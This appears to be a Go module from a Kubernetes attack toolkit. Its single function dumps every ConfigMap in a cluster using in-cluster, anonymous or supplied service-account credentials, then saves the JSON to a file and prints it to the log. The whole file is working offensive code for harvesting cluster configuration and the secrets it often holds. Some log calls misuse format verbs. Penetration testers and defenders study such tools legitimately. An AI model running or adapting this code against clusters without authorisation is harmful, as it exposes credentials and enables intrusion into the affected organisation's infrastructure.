package attack

import (
	"errors"
	"io/ioutil"

	log "github.com/sirupsen/logrus"

	"context"
	"encoding/json"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	rest "k8s.io/client-go/rest"
)

func K8sConfigMapsDump(token string) {
	var config = new(rest.Config)
	var err = errors.New("")
	switch token {
	case "anonymous":
		config, err = rest.InClusterConfig()
		if err != nil {
			log.Fatal(err)
		}
		config = rest.AnonymousClientConfig(config)
	case "default":
		config, err = rest.InClusterConfig()
		if err != nil {
			log.Fatal(err)
		}
	default:
		config, err = SelfSAConfig(token)
		if err != nil {
			log.Fatal(err)
		}
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		log.Fatal(err)
	}
	ConfigMaps, err := clientset.CoreV1().ConfigMaps("").List(context.TODO(), metav1.ListOptions{})
	if err != nil {
		log.Fatal(err)
	}
	log.Println("Get %d ConfigMaps", len(ConfigMaps.Items))
	data, err := json.Marshal(ConfigMaps)
	if err != nil {
		log.Fatal(err)
	}
	output := "cluster_ConfigMaps"
	if err = ioutil.WriteFile(output, data, 0644); err != nil {
		log.Fatal(err)
	}
	log.Info(string(data))
	log.Info("Cluster ConfigMaps have been saved to %s", output)
}
